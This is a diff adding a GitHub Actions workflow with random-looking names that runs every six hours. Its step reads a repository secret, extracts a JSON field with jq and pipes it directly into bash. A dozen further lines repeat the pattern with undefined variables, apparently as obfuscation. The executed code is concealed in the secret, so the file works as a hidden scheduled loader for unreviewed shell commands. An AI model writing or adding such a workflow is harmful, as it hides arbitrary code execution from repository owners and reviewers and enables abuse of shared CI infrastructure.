@@ -1,0 +1,28 @@
+name: dongzhaliang9876
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongzhaliang9876
+        env:
+          qaj2: ${{ secrets.qaj2 }}
+        run: |
+          echo $qaj2 | jq -r .obil81040 | /bin/bash
+          echo $bx0 | jq -r .fpb0 | /bin/bash
+          echo $yo4 | jq -r .ezha82088 | /bin/bash
+          echo $xje4 | jq -r .pxkgv16 | /bin/bash
+          echo $f50 | jq -r .g13 | /bin/bash
+          echo $cwrip5 | jq -r .ywy9 | /bin/bash
+          echo $pe3124 | jq -r .q57537 | /bin/bash
+          echo $j0 | jq -r .habdw18 | /bin/bash
+          echo $fzvd5 | jq -r .awa0298 | /bin/bash
+          echo $lra28222 | jq -r .looye95 | /bin/bash
+          echo $rjz6 | jq -r .est571 | /bin/bash
+          echo $ymd0 | jq -r .dst6 | /bin/bash
+          echo $j10136 | jq -r .cnrlr0 | /bin/bash
+
